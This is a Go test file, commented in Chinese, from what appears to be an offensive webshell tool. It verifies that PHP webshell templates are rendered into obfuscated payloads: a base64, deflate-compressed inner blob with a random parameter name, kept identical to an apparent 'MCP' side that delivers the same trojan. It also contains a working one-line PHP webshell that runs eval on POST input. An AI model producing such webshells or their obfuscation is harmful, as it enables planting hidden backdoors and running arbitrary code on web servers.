package server

import (
	"bytes"
	"compress/flate"
	"encoding/base64"
	"io"
	"strings"
	"testing"
)

// 加密载荷：带占位符的模板必须渲染出「密文 + 随机参数名」，且密文解出来要与
// MCP 侧的 inner 逻辑逐字一致（两边下发同一匹马，任何一侧漂移都要在这里炸）。
func TestWebshellRenderDynamicPayload(t *testing.T) {
	tpl := "<?php\n$K = '" + webshellEncKeyToken + "';\n$C = base64_decode('" + webshellEncBlobToken + "');\n"

	out, key, err := webshellRenderDynamicPayload(tpl, "")
	if err != nil {
		t.Fatalf("render err: %v", err)
	}
	if len(key) != 8 {
		t.Fatalf("默认参数名应为 8 位，got %q", key)
	}
	if strings.ContainsAny(key[:1], "0123456789") {
		t.Fatalf("参数名首字符必须是字母，got %q", key)
	}
	if strings.Contains(out, webshellEncKeyToken) || strings.Contains(out, webshellEncBlobToken) {
		t.Fatalf("渲染后不应残留占位符:\n%s", out)
	}
	if !strings.Contains(out, "$K = '"+key+"';") {
		t.Fatalf("参数名没写进载荷:\n%s", out)
	}

	// 取出密文并解压，确认 inner 逻辑与常量一致（gzinflate 对应裸 deflate）
	start := strings.Index(out, "base64_decode('") + len("base64_decode('")
	end := strings.Index(out[start:], "')")
	if start < len("base64_decode('") || end <= 0 {
		t.Fatalf("没找到密文段:\n%s", out)
	}
	blob := out[start : start+end]
	raw, err := base64.StdEncoding.DecodeString(blob)
	if err != nil {
		t.Fatalf("密文不是合法 base64: %v", err)
	}
	zr := flate.NewReader(bytes.NewReader(raw))
	plain, err := io.ReadAll(zr)
	if err != nil {
		t.Fatalf("密文解压失败: %v", err)
	}
	if string(plain) != webshellEncInner {
		t.Fatalf("inner 逻辑漂移:\n got=%s\nwant=%s", plain, webshellEncInner)
	}

	// 指定参数名按原样使用；非法参数名要拒绝
	out2, key2, err := webshellRenderDynamicPayload(tpl, "abc12345")
	if err != nil || key2 != "abc12345" || !strings.Contains(out2, "'abc12345'") {
		t.Fatalf("指定参数名失败: key=%q err=%v", key2, err)
	}
	if _, _, err := webshellRenderDynamicPayload(tpl, "bad-name!"); err == nil {
		t.Fatalf("非法参数名应报错")
	}

	// 普通载荷原样返回，不生成参数名
	static := "<?php @eval($_POST['pass']);"
	got, k, err := webshellRenderDynamicPayload(static, "")
	if err != nil || k != "" || got != static {
		t.Fatalf("普通载荷不该被改动: %q %q %v", got, k, err)
	}
}
